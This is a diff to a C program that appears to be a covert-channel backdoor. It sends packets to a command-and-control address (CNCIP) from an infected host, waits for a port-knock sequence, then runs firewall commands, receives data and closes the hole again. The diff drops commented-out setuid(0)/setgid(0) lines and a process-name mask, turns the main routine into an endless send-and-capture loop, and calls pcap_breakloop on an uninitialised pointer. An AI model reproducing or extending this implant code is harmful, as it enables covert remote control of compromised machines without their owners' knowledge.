@@ -38,10 +38,6 @@ int knocking[2];
 int pattern[2];
 
 int main(int argc, char **argv){
-    //strcpy(argv[0], MASK);
-    //change the UID/GID to 0 to raise privs
-    //setuid(0);
-    //setgid(0);
     char *c = "c";
     char *sip = CNCIP;
     char *dip = INFECTEDIP;
@@ -53,15 +49,10 @@ int main(int argc, char **argv){
     knocking[0] = 0;
     knocking[1] = 0;
 
-
-    if(strcmp(argv[1],c) == 0){
-        covert_send(sip, dip, sport, dport, data, 0);
-        Packetcapture();
-        exit(1);
-    } else {
-        Packetcapture();
+    while(1){
+    covert_send(sip, dip, sport, dport, data, 0);
+    Packetcapture();
     }
-
     return 0;
 }
 
@@ -196,6 +187,8 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
             }
         }
     if((knocking[0] == 1) && (knocking[1] == 1)){
+        pcap_t* interfaceinfo;
+
         system(IPTABLES);
         char *dip = INFECTEDIP;
         unsigned short sport = SHPORT;
@@ -203,6 +196,7 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
         printf("WAITING FOR DATA\n");
         recv_results(dip, dport);
         system(TURNOFF);
+        pcap_breakloop(interfaceinfo);
     }
     } else {
         if(size_payload > 0){
